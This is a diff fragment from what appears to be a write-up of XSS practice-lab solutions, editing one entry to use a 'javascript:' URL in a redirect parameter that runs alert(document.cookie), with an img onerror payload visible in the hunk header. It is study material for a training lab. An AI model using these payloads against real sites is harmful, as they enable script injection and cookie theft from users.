@@ -508,13 +508,12 @@ https://32uzzqzc.hacky.uk/test.ftl?name=%3Cimg%20src=x%20onx=w%20onerror=alert(d
 - **URL Lab**: https://xssy.uk/lab/768
 - **Payload**: 
 ```
-https://eqh42jmm.xssy.uk/index.html
+javascript:alert(document.cookie)//;https://
 ```
 - **Full URL**: 
 ```
-https://5zrbyrdi.xssy.uk/target.ftl?return=https://eqh42jmm.xssy.uk/index.html
+https://5zrbyrdi.xssy.uk/target.ftl?return=javascript:alert(document.cookie)//;https://
 ```
-- **Description**: Can redirect, but fail to get cookie
 
 ---
 
